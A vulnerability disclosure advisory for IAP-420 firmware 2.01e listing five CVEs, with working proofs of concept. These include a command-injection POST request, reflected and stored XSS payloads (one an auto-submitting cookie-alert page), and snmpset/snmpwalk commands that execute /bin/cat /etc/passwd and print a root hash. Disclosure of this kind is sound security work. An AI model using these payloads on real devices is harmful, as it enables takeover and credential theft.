### Vulnerable versions

IAP-420 / 2.01e

#### Vulnerability overview

1) Authenticated Command Injection (CVE-2024-55544)

A command injection was identified on the webserver. This vulnerability can only be exploited if a user is authenticated on the web interface. This way, an attacker can invoke commands and is able to get full control over the whole device.

2) Reflected Cross-Site Scripting (CVE-2024-55545)

A reflected cross-site scripting vulnerability is present on the sub page “even\_log.cgi”, which is used to display event logs. It can be exploited in the context of a victim’s session.

3) Stored Cross-Site Scripting (CVE-2024-55546)

A stored cross-site scripting vulnerability has been identified in the firmware of the device. It was identified in the device properties and can be exploited in the context of a victim’s session.

4) Remote Command Execution via SNMP (CVE-2024-55547)

SNMP allows to write the nsExtendObjects. This enables an attacker to execute commands on the operating system of the device.

5) Denial of Service (CVE-2024-55548)

A denial of service (DoS) condition can be reached if a password with more than 16 characters is set in a user account. This is only possible as authenticated user and by disabling the lenght check in the input fields.

#### Proof of Concept

##### 1) Authenticated Command Injection (CVE-2024-55544)

The following GET request creates a file named “test” in the “/tmp” directory.

```
POST /cgi-bin/even_log.cgi HTTP/1.1
Host: 10.69.10.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 553
Origin: http://10.69.10.2
Connection: keep-alive
Referer: http://10.69.10.2/cgi-bin/even_log.cgi
Cookie: <auth-cookie>
Upgrade-Insecure-Requests: 1
tf_logserver_ip=10.10.10.0&tf_logserver_port=;touch%20/tmp/test&Submit=Apply&
ret_msg=&lang=en&h_ColdLog=off&h_WarmLog=off&h_AuthLog=off&h_IpLog=off&
h_PwdLog=off&h_RedundantPowerLog=&h_LinkChangedLog=off&
h_SNMPAccessFailedLog=off&h_WlcAssociatedLog=off&h_WlcDisassociatedLog=off&

h_DI1HtoLLog=&h_DI2HtoLLog=&h_DI3HtoLLog=&h_DI4HtoLLog=
```

This way, the file “/tmp/test” gets created on the filesystem.

##### 2) Reflected Cross-Site Scripting (CVE-2024-55545)

The following payload can be used to trigger a Cross-Site Scripting:
```
"><script >alert(document.cookie)</script >
```
This has been implemented as HTML file as simple Proof-of-Concept:

```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>XSS PoC</title>
</head>
<body>
<h1>XSS Proof of Concept</h1>
<form id="xssForm" action="http://10.69.10.2/cgi-bin/even_log.cgi" method="POST">
<input type="hidden" name="tf_logserver_ip" value="&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;">
<input type="hidden" name="tf_logserver_port" value="66">
<input type="hidden" name="Submit" value="Apply">

<input type="hidden" name="h_Eth2LinkDownLog" value="off">
</form>
<script>
document.getElementById('xssForm').submit();
</script>
</body>
</html>
```
##### 3) Stored Cross-Site Scripting (CVE-2024-55546)

Permanent JavaScript code can be stored on the device by abusing certain system settings as shown below:

```
POST /cgi-bin/basic_sysset.cgi HTTP/1.1
Host: 10.69.10.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: http://10.69.10.3
Connection: keep-alive
Referer: http://10.69.10.3/cgi-bin/basic_sysset.cgi?lang=en
Cookie: auth=YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
tf_devname=%3Cscript%3E%2F*&tf_devlocation=*%2Falert%281%29%3B%2F*&tf_devdes=*%2F%3C%2Fscript%3E&bt_apply=Apply&lang=en&ret_msg=
```

Everytime, when the sub page is loaded, the placed JavaScript code is executed.

##### 4) Remote Command Execution via SNMP (CVE-2024-55547)

Setting the SNMP nsExtendObjects can be done with the command “snmpset”:

```
$ snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c public 10.69.10.3 'nsExtendStatus."evilcommand"' = createAndGo 'nsExtendCommand."evilcommand"' = /bin/cat 'nsExtendArgs."evilcommand"' = '/etc/passwd'
NET-SNMP-EXTEND-MIB::nsExtendStatus."evilcommand" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."evilcommand" = STRING: /bin/cat
NET-SNMP-EXTEND-MIB::nsExtendArgs."evilcommand" = STRING: /etc/passwd
```
Executing the placed command “/bin/cat” can be done with “snmpwalk”, as it

invokes the objects which causes an execution:

```
$ snmpwalk -v2c -c public 10.69.10.3 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."evilcommand" = STRING: /bin/cat
NET-SNMP-EXTEND-MIB::nsExtendArgs."evilcommand" = STRING: /etc/passwd
NET-SNMP-EXTEND-MIB::nsExtendInput."evilcommand" = STRING:
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."evilcommand" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."evilcommand" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."evilcommand" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."evilcommand" = INTEGER: volatile(2)
NET-SNMP-EXTEND-MIB::nsExtendStatus."evilcommand" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."evilcommand" = STRING: root:k6GmNCQYU9ZQU:0:0:Adminstrator:/:/bin/sh
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."evilcommand" = STRING: root:k6GmNCQYU9ZQU:0:0:Adminstrator:/:/bin/sh
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."evilcommand" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."evilcommand" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."evilcommand".1 = STRING: root:k6GmNCQYU9ZQU:0:0:Adminstrator:/:/bin/sh
```
In this case, the file “/etc/passwd” is printed.

##### 5) Denial of Service (CVE-2024-55548)

Disabling the lenght check in the input field enables to set a password longer than 16 characters. By doing so, the device reaches a DoS state and it’s web interface is not usable anymore.

The vulnerabilities were manually verified on an emulated device by using the MEDUSA scalable firmware runtime (<https://medusa.cyberdanube.com>).

#### Solution

None.

#### Workaround

Restrict network access to the device. Restrict access to the management interface.

#### Recommendation

CyberDanube recommends to change the hardware.
